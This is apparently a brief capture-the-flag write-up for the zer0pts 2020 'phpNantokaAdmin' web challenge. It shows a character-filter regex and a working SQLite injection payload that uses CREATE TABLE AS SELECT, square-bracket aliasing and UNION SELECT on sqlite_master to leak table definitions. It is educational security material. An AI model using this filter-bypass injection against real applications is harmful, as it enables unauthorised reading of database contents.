---
title: "phpNantokaAdmin - zer0pts 2020"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "union-select", "nosql-injection", "sqlite", "phpnantokaadmin"]
summary: "web writeup for \"phpNantokaAdmin\" from zer0pts - techniques: sqli, union-select, nosql-injection, sqlite, phpnantokaadmin."
source:
  name: "perfectblue/ctf-writeups"
  url: "https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2020/zer0pts-2020/phpNantokaAdmin/README.md"
ctf:
  name: "zer0pts"
  year: 2020
  challenge: "phpNantokaAdmin"
---

## Source

- **CTF:** zer0pts 2020
- **Challenge:** phpNantokaAdmin
- **Repository:** [perfectblue/ctf-writeups](https://github.com/perfectblue/ctf-writeups)
- **File:** <https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2020/zer0pts-2020/phpNantokaAdmin/README.md>

---
### phpNantokaAdmin

Very interesting challenge:

- SQLite injection like this:

```
CREATE TABLE {injection} (dummy1 TEXT, dummy2 TEXT, `{injection_2}` {injection_3}, ...)
```

- Each of those injections are limited to 32 chars and have to pass the following regex:

```php
function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}
```


- Solution is to use `CREATE TABLE ... SELECT` statement which populates the new table with the content from the select statement.

- Use the `[]` keywords to wrap the irrelevant stuff into an alias and create a valid query:

```
table_name=neko as select 1 as [&columns[0][name]=] UniOn Select sql as &columns[0][type]=lol&columns[1][name]= from sqlite_master;&columns[1][type]=XXXXXX
```

- The query becomes

```
CREATE TABLE neko as select 1 as [ (dummy1 TEXT, dummy2 TEXT, `] UniOn Select sql as ` lol, ` from sqlite_master;` XXXXXX);
```
